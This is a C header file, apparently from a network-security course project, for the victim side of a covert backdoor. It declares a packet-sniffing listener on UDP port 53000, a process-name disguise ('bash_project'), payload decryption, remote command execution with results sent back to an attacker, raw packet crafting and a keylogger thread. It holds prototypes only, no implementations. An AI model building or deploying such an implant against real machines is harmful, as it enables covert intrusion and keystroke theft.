#ifndef COMP8505_PROJECT_VICTIM_H
#define COMP8505_PROJECT_VICTIM_H

#include "common.h"


#define TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"

#define DEFAULT_PORT 53000
#define FILTER "udp and dst port 53000"
#define TRUE 1
#define FALSE 0
#define MASK "bash_project"


const char *builtin_str[] = {
        "cd",
        "exit"
};

// Function Prototypes
void options_victim_init(struct options_victim *opts);
void initialize_victim_server(struct options_victim *opts);
void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);
void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void convert_uint32t_ip_to_str(uint32_t ip_addr, char *ip, char flag);
void extract_instruction(u_char *args);
void execute_instruction(u_char *args);
char **split_line(char *line);
int execute_command(char **command_arr, u_char *args);
int num_builtins(void);
int builtin_cd(char **args);
int builtin_exit(char **args);
int launch(char **command_arr, u_char *args);
void send_to_attacker(u_char *args);
unsigned short create_udp_header(struct udphdr* uh, uint16_t port);
unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args);

void* activate_keylogger(void* arg);
void* activate_cvc(void* arg);
void activate_select_multiplexing(void* arg);


int (*builtin_func[]) (char **) = {
        &builtin_cd,
        &builtin_exit
};


u_int16_t handle_ethernet (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void print_payload (const u_char *, int);
void print_hex_ascii_line (const u_char *, int, int);
void decrypt_payload(u_char *payload);
void extract_square_bracket_string(char* input);

void *track_opts_victim_flag(void *vargp);
void pkt_callback2(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);



#endif //COMP8505_PROJECT_VICTIM_H
